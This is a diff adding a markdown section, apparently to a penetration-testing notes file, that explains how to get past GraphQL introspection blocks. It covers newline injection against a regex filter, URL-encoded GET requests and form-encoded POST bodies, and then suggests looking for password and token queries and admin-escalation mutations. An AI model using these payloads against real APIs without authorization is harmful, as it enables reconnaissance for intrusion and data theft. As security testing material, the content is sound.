@@ -1038,6 +1038,167 @@ query { __typename }
 
 
 
+<details>
+  <summary>Bypassing GraphQL introspection defenses</summary>
+
+
+# 🔍 Bypassing GraphQL Introspection Defenses
+
+When developers try to secure GraphQL APIs by disabling **introspection**, they often rely on naive regex filters that block any query containing `__schema`. However, these filters can be bypassed in clever ways.
+
+
+
+
+---
+
+## 🔐 What Developers Do (Wrongly)
+
+To prevent this, developers often filter out requests containing `__schema` or `__introspection`, using regular expressions.
+
+Example:
+```regex
+/__schema{/
+```
+
+This blocks simple introspection queries... **but only the exact format.**
+
+---
+
+## 💥 Bypass Techniques
+
+### 1. Inject Special Characters
+
+GraphQL **ignores whitespaces, new lines, and commas**.
+
+But naive regex filters don’t. So, by inserting harmless characters, you bypass the filter.
+
+#### Example: Using a Newline Character
+
+```json
+{
+  "query": "query{__schema
+{queryType{name}}}"
+}
+```
+
+#### Why this works:
+
+- The developer's regex blocks `__schema{`
+- But `__schema
+{` doesn’t match their pattern
+- Yet GraphQL still parses it correctly ✅
+
+---
+
+### 2. Try Alternative Request Methods
+
+Developers may only disable introspection on POST requests.
+
+Try:
+
+#### ▶ GET Request with URL-Encoded Introspection Query
+
+```http
+GET /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D
+```
+
+Decoded:
+```graphql
+query {
+  __schema
+  {
+    queryType {
+      name
+    }
+  }
+}
+```
+
+#### ▶ POST Request with Form URL-Encoded Body
+
+```http
+POST /graphql
+Content-Type: application/x-www-form-urlencoded
+
+query=query{__schema{queryType{name}}}
+```
+
+---
+
+## 🧠 Extra Tips
+
+- Save results to your Burp Suite **Site Map** for later analysis
+- Combine this with tools like **GraphQL Voyager**, **InQL**, or **GraphQLmap** to visualize the schema
+- Once schema is found, try:
+  - Sensitive queries (email, password, tokens)
+  - Mutations that may allow actions like reset, delete, or admin escalation
+
+---
+
+## 🛠 Want to Automate This?
+
+You can easily script these bypass attempts using **Python + requests** to iterate over multiple bypass formats and content-types.
+
+Let me know if you want the script.
+
+---
+
+## ✅ Goal
+
+Get access to the full GraphQL schema **even if introspection is "disabled".**
+This enables a full map of the API surface for further exploitation.
+
+---
+
+Stay sneaky 😎
+
+  
+</details>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
